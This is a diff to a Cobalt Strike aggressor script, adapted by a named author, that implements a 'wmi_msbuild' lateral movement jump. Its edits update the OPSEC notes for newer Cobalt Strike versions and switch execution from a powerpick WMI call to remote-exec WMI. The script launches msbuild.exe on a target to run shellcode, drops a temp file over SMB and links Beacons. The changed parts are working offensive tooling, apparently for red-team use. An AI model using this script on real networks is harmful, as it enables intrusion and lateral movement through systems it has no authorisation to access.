@@ -1,7 +1,7 @@
 ######################################
 ## MsBuild via Cobalt Strike 		##
 ######################################
-## Adapted by @andrewchiles for CS 4.0 jump and removed PowerLessShell requirement
+## Adapted by @andrewchiles for CS 4.0+ jump and removed PowerLessShell requirement
 ## Original Authors: 		Alyssa (ramen0x3f), MrT__F version for PowerLessShell
 
 
@@ -18,8 +18,7 @@
 # 	[-path C:\new\path]
 
 #### OPSEC Notes ####
-# Uses powerpick on source system by default to execute WMI
-# Spawns powershell.exe on source system to execute WMI if you use the remote-exec option
+# Uses powershell.exe on source system by default to execute WMI (prior to CS 4.2), if 4.2+ then a Beacon inline BOF is used for the remote-exec wmi command
 # Spawns msbuild.exe on target system by default
 # Writes a temporary file on target system at C:\Windows\Temp\<random>.TMP via SMB (You will need access to TCP\445)
 # Change the XML template in the associate python script if you want to mix up the shellcode execution technique (e.g., use remote process injection)
@@ -234,12 +233,12 @@ sub jump_wmi_msbuild {
 	# Launch #
 	##########
 	$command = $msbuild . ' ' . strrep($payload_dir, "$", ":") . $msbuild_payload_filename . ' /noconsolelogger';
-	## Do all through remote-exec WMI (this method uses powershell.exe)
-	#bremote_exec($1, "wmi", $2, $command);
+	## Do all through remote-exec WMI (this method uses powershell.exe in CS4.1, but 4.2 now uses an inline BOF to accomplish the same goal)
+	bremote_exec($1, "wmi", $2, $command);
 	
-	# Execute msbuild via powerpick (make it silent with ! after bpowerpick, but you will lose errors from the WMI execution
-	$psh_command = "Invoke-WmiMethod -Computername $2 -Name Create -Class Win32_PROCESS \"$command\"";
-	bpowerpick($1,$psh_command);
+	# Execute msbuild via powerpick for CS 4.1 if we don't want to spawn powershell.exe (make it silent with ! after bpowerpick, but you will lose errors from the WMI execution
+	#$psh_command = "Invoke-WmiMethod -Computername $2 -Name Create -Class Win32_PROCESS \"$command\"";
+	#bpowerpick($1,$psh_command);
 	
 	## Link to TCP\SMB Beacons
 	beacon_link($1, $2, $3);
@@ -313,7 +312,7 @@ alias rename_msbuild {
 beacon_remote_exploit_register(
 	"wmi_msbuild", 
 	"x64", 
-	"wmi lateral movement with msbuild c# task",
+	"wmi lateral movement with msbuild inline c# task",
 	&jump_wmi_msbuild);
 
 	# Arguments
